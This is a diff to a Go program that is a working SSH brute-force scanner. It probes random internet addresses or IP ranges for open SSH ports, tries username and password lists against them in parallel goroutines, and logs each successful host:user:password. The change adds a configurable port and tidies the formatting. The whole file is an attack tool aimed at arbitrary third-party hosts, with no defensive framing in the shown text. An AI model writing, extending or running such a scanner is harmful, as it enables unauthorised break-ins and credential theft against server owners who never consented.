@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"flag"
 	"fmt"
 	"math/rand"
@@ -10,7 +11,6 @@ import (
 	"strings"
 	"syscall"
 	"time"
-	"bufio"
 
 	"github.com/dynport/gossh"
 )
@@ -27,10 +27,10 @@ func check(err error, msg string) {
 	}
 }
 
-func trySSH(user, pass, host string) bool {
-
+func trySSH(user, pass, host string, port int) bool {
 
 	client := gossh.New(host, user)
+	client.Port = port
 	client.SetPassword(pass)
 	defer client.Close()
 
@@ -40,31 +40,31 @@ func trySSH(user, pass, host string) bool {
 
 		if strings.Contains(e.Error(), "unable to authenticate") {
 			if *verbose {
-				fmt.Printf("[%s] [%s] [%s]\n",host,user,pass)
+				fmt.Printf("[%s] [%s] [%s]\n", host, user, pass)
 			}
 			return false
 		} else if strings.Contains(e.Error(), "ssh: handshake failed: EOF") {
 			cPwds <- pass
 			if *verbose {
-				fmt.Printf("[%s] [%s] [%s] retrying...\n",host,user,pass)
+				fmt.Printf("[%s] [%s] [%s] retrying...\n", host, user, pass)
 			}
 			return false
 
 		} else if strings.Contains(e.Error(), "process exited with") {
 			if *verbose {
-				fmt.Printf("[%s] [%s] [%s] Goooooood!!!! %s\n",host,user,pass,e.Error())
+				fmt.Printf("[%s] [%s] [%s] Goooooood!!!! %s\n", host, user, pass, e.Error())
 			}
 			return true
-		} 
+		}
 
 		if *verbose {
-			fmt.Printf("[%s] [%s] [%s] %s\n",host,user,pass, e.Error())
+			fmt.Printf("[%s] [%s] [%s] %s\n", host, user, pass, e.Error())
 		}
 		return false
-	} 
+	}
 
 	if *verbose {
-		fmt.Printf("[%s] [%s] [%s] Goooooood!!!!\n",host,user,pass)
+		fmt.Printf("[%s] [%s] [%s] Goooooood!!!!\n", host, user, pass)
 	}
 	return true
 }
@@ -83,7 +83,7 @@ func signals() {
 			fmt.Println(s)
 		}
 	}()
-}	
+}
 
 func randInt(min int, max int) int {
 	rand.Seed(time.Now().UTC().UnixNano())
@@ -94,8 +94,8 @@ func genIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d", randInt(15, 200), randInt(5, 220), randInt(5, 220), randInt(5, 220))
 }
 
-func checkSSHPort(ip string, timeout time.Duration) bool {
-	conn, err := net.DialTimeout("tcp", ip+":22", timeout*time.Second)
+func checkSSHPort(ip string, port int, timeout time.Duration) bool {
+	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), timeout*time.Second)
 	if err != nil {
 		return false
 	}
@@ -112,41 +112,41 @@ func checkSSHPort(ip string, timeout time.Duration) bool {
 	return false
 }
 
-func brute(ip string) {
+func brute(ip string, port int) {
 	//fmt.Printf("Bruteforcing %s\n", ip)
 	for _, p := range pwds {
 		for _, u := range users {
 			//fmt.Printf("%s:%s\n", u, p)
 			go func(u string, p string, ip string) {
-				if trySSH(u, p, ip) {
+				if trySSH(u, p, ip, port) {
 					log(ip + ":" + u + ":" + p)
 					return
 				}
-			} (u,p,ip)
+			}(u, p, ip)
 		}
 	}
 	//fmt.Printf("End bruteforce %s\n", ip)
 }
 
-func randomNode() {
+func randomNode(port int) {
 	var ip string
 
 	for {
 		ip = genIP()
-		if checkSSHPort(ip, 2) {
-			brute(ip)
+		if checkSSHPort(ip, port, 2) {
+			brute(ip, port)
 		}
 	}
 }
 
-func checkIP(ip string) {
+func checkIP(ip string, port int) {
 	//fmt.Println("checking ", ip)
-	if checkSSHPort(ip, 2) {
-		go brute(ip)
+	if checkSSHPort(ip, port, 2) {
+		go brute(ip, port)
 	}
 }
 
-func node(startIP string, endIP string) {
+func node(startIP string, endIP string, port int) {
 	sIP := ip2octet(startIP)
 	eIP := ip2octet(endIP)
 
@@ -156,7 +156,7 @@ func node(startIP string, endIP string) {
 				for d := sIP[3]; d <= eIP[3]; d++ {
 
 					ip := octet2ip([4]int{a, b, c, d})
-					checkIP(ip)
+					checkIP(ip, port)
 				}
 			}
 		}
@@ -195,7 +195,7 @@ func loadWordlist(wordlist string) {
 }
 
 func main() {
-	login := flag.String("login","", "login to brute")
+	login := flag.String("login", "", "login to brute")
 	dict := flag.String("dict", "", "passwords dictionary file")
 	startIP := flag.String("start", "", "starting ip")
 	endIP := flag.String("end", "", "ending ip")
@@ -204,6 +204,7 @@ func main() {
 	rndMode := flag.Bool("rnd", false, "scan randomly")
 	verbose = flag.Bool("v", false, "verbose mode")
 	doRM := flag.Bool("rm", false, "rm")
+	port := flag.Int("port", 22, "SSH port")
 	flag.Parse()
 
 	signals()
@@ -214,9 +215,9 @@ func main() {
 
 	if *rndMode {
 		for i := 0; i < *goroutines-1; i++ {
-			go randomNode()
+			go randomNode(*port)
 		}
-		randomNode()
+		randomNode(*port)
 		return
 	}
 
@@ -224,15 +225,15 @@ func main() {
 		//single ip mode
 
 		//single login mode + wordlist
-		if len(*login)>0 {
+		if len(*login) > 0 {
 
-			if len(*dict)<=0 {
+			if len(*dict) <= 0 {
 				fmt.Println("plsease select the dictionary file")
 				return
 			}
 
-			if !checkSSHPort(*IP, 5) {
-				fmt.Printf("No SSH found at %s",*IP)
+			if !checkSSHPort(*IP, *port, 5) {
+				fmt.Printf("No SSH found at %s", *IP)
 				return
 			}
 
@@ -240,28 +241,28 @@ func main() {
 			go loadWordlist(*dict)
 
 			for i := 0; i < *goroutines; i++ {
-				go func(ip string, login string, id int) {
-				
+				go func(ip string, port int, login string, id int) {
+
 					for pwd := range cPwds {
-						if trySSH(login, pwd, ip) {
+						if trySSH(login, pwd, ip, port) {
 							log(ip + ":" + login + ":" + pwd)
 							os.Exit(1)
 							return
 						}
 					}
 
-				} (*IP, *login, i)
+				}(*IP, *port, *login, i)
 			}
 
 		} else {
 			// single ip mode with default users+passwords
-			checkIP(*IP)
+			checkIP(*IP, *port)
 		}
 
 		wait()
 		return
 	}
 
-	node(*startIP, *endIP)
+	node(*startIP, *endIP, *port)
 	wait()
 }
